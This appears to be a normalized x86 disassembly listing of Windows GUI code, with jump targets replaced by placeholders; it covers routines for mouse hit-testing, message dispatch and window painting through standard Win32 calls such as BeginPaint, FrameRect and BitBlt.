mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c2a
call sub_43a830
call sub_427548
retn
sub_440c54
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_415348
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x1c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x1c ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xc ]
mov [ ebp - 0x4 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x8 ]
mov [ ebp - 0x2 ] ax
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43d400
test eax eax
setne al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_440d20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x1cc ]
test eax eax
je r-xdata
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x1d0 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
test bl bl
je r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1cc ]
call sub_4167c8
call sub_440c54
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x1
push 0x1
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_4167c8
mov edx [ ebp - 0x4 ]
movzx ecx [ ebp - 0xd ]
call sub_440d20
mov [ ebp - 0x14 ] eax
dec edi
cmp edi 0xffffffff
jne r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_4167c8
call sub_440c54
pop ecx
test al al
jne r-xdata
sub_440de4
push ebx
push esi
push edi
add esp 0xfffffed8
mov ebx ecx
mov edi edx
mov esi eax
call GetMessagePos
call sub_4071c0
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov ecx esp
lea edx [ esp + 0xc ]
mov eax esi
call sub_43bc78
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_440d20
mov ebx eax
xor eax eax
cmp esi ebx
je r-xdata
mov eax [ esp ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x118 ] eax
mov eax [ esp ]
sub eax [ ebx + 0x40 ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x118 ] eax
jmp r-xdata
add eax 0xfffffdff
sub eax 0x2
jb r-xdata
add eax 0xffffff5f
sub eax 0x2
jb r-xdata
movzx eax [ edi + 0x8 ]
mov [ esp + 0x11c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x124 ] eax
movzx eax [ edi + 0xa ]
cmp eax 0x201
jge r-xdata
mov [ esp + 0x120 ] 0x0
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
lea eax [ esp + 0x14 ]
push eax
call GetKeyboardState
lea eax [ esp + 0x14 ]
call sub_44e678
mov [ esp + 0x121 ] al
lea eax [ esp + 0x114 ]
push eax
xor ecx ecx
mov edx 0xb04b
mov eax ebx
call sub_43d400
mov [ edi + 0xc ] eax
mov al 0x1
jmp r-xdata
mov [ esp + 0x120 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x120 ] 0x2
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x120 ] 0x0
sub_440f30
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
mov ebx eax
mov eax ebx
call sub_443be8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax ebx
call sub_440d20
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x14 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x14 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43d400
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_440fe4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx eax
cmp edx 0x100
jge r-xdata
cmp edx 0x2a3
jg r-xdata
cmp edx 0x1f
jg r-xdata
sub edx 0xb047
je r-xdata
je r-xdata
sub edx 0x21
je r-xdata
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e778
mov ebx eax
test ebx ebx
je r-xdata
sub edx 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
add edx 0xffffff00
sub edx 0xa
jb r-xdata
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_440de4
test al al
je r-xdata
sub edx 0x63
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
sub edx 0x7
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d4dc
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb014
call sub_43d400
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c974
test al al
jne r-xdata
add edx 0xffffff0a
sub edx 0xb
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d4dc
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e778
mov ebx eax
test ebx ebx
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb047
mov eax ebx
call sub_43d400
jmp r-xdata
xor eax eax
push ebp
push sub_441443
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x23c ] edx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp eax 0x200
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
movsx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_43bc78
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_440d20
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
jmp r-xdata
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440f30
test al al
je r-xdata
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0xa ]
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
call sub_415348
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43bbc8
lea eax [ ebp - 0x10 ]
mov dl 0x1
call sub_43a6b0
mov ebx eax
call sub_438ee4
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x23c ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d4dc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43d400
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x1
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x28 ] 0x2
mov eax [ ebp - 0x4 ]
call sub_443be8
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call _TrackMouseEvent
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb014
call sub_43d400
mov edx [ ebp - 0x4 ]
mov eax ebx
mov [ edx + 0x23c ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_41dd70
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_41db30
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb013
call sub_43d400
sub_44145c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43d7ac
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43d400
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x1a4 ]
call sub_423ec0
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x1a4 ]
call sub_423efc
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43bcd4
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x1b4 ]
push eax
mov eax [ esi + 0x1a8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_441564
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_438b98
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43d400
mov [ esi + 0xc ] eax
mov bl 0x1
sub_441598
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_4416f7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1cc ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call BeginPaint
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4416ba
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
jmp r-xdata
dec edi
je r-xdata
inc ebx
xor esi esi
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_441730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4416fe
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call EndPaint
inc esi
dec ebx
jne r-xdata
test [ eax + 0x55 ] 0x8
jne r-xdata
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_4167c8
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov ecx [ eax + 0x44 ]
add ecx [ eax + 0x4c ]
push ecx
mov edx [ eax + 0x40 ]
mov ecx edx
add ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x44 ]
push ecx
push edx
mov eax [ ebp - 0x10 ]
push eax
call ExcludeClipRect
mov edi eax
cmp edi 0x1
je r-xdata
sub_441730
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx ebx
call sub_416824
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx [ ebp - 0xc ]
call sub_4167c8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
dec edi
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx [ ebp - 0xc ]
call sub_4167c8
mov ebx eax
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0x44 ]
mov eax esi
mov edx [ ebp - 0x18 ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax + 0x40 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
add ecx [ eax + 0x48 ]
mov edx esi
mov eax ebx
call sub_415370
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax 0xff000010
call sub_423140
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_415370
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax 0xff000014
call sub_423140
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_415370
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4418dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x8 ]
call sub_43a744
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x18 ]
call sub_43d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x18 ]
or [ eax + 0x54 ] 0x80
sub_441a00
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_441b78
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43a744
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor ebx ebx
xor esi esi
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov esi 0xa
mov ebx 0x200f
jmp r-xdata
test ebx ebx
je r-xdata
mov esi 0x3
mov ebx 0xa00f
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x4 ]
call sub_43d400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
push ebx
push esi
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_43a744
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b7f
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_441a00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_4167c8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_441b90
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x240 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441598
jmp r-xdata
mov eax ebx
call sub_43ff78
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441ce2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443be8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43d400
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_441b90
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443be8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
